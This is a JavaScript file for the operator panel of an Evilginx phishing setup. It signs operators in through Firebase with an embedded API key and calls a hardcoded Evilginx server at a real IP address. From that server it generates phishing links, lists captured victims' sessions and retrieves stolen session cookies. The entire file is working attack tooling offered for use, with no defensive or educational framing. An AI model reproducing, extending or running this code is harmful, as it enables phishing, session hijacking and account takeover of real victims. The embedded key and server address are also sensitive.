// Firebase Configuration
const firebaseConfig = {
    apiKey: "AIzaSyDiNWtXm4oHQ6NpHPiLJjV4EDgU7yUQjq0",
    authDomain: "panel-auth-134b7.firebaseapp.com",
    projectId: "panel-auth-134b7",
    storageBucket: "panel-auth-134b7.firebasestorage.app",
    messagingSenderId: "892746068340",
    appId: "1:892746068340:web:f8c4d5b798e8bc48447c21"
};

// Initialize Firebase
firebase.initializeApp(firebaseConfig);
const auth = firebase.auth();

// Evilginx Server
const EVILGINX_SERVER = "http://3.149.242.245";

// Login Function
function login() {
    let email = document.getElementById("email").value;
    let password = document.getElementById("password").value;

    auth.signInWithEmailAndPassword(email, password)
        .then(() => {
            window.location.href = "dashboard.html";
        })
        .catch(error => {
            alert("Login failed: " + error.message);
        });
}

// Logout Function
function logout() {
    auth.signOut().then(() => {
        window.location.href = "index.html";
    });
}

// Generate Link from Evilginx
function generateLink() {
    fetch(`${EVILGINX_SERVER}/generate`, {
        method: "POST"
    })
    .then(response => response.json())
    .then(data => {
        document.getElementById("data-output").innerHTML = `Generated Link: ${data.link}`;
    })
    .catch(error => console.error("Error generating link:", error));
}

// Fetch Captured Sessions
function fetchSessions() {
    fetch(`${EVILGINX_SERVER}/sessions`)
    .then(response => response.json())
    .then(data => {
        let output = "<h3>Captured Sessions</h3><ul>";
        data.forEach(session => {
            output += `<li>${session.ip} - ${session.user_agent}</li>`;
        });
        output += "</ul>";
        document.getElementById("data-output").innerHTML = output;
    })
    .catch(error => console.error("Error fetching sessions:", error));
}

// Fetch Cookies
function fetchCookies() {
    fetch(`${EVILGINX_SERVER}/cookies`)
    .then(response => response.json())
    .then(data => {
        let output = "<h3>Cookies</h3><ul>";
        data.forEach(cookie => {
            output += `<li>${cookie.name}: ${cookie.value}</li>`;
        });
        output += "</ul>";
        document.getElementById("data-output").innerHTML = output;
    })
    .catch(error => console.error("Error fetching cookies:", error));
}
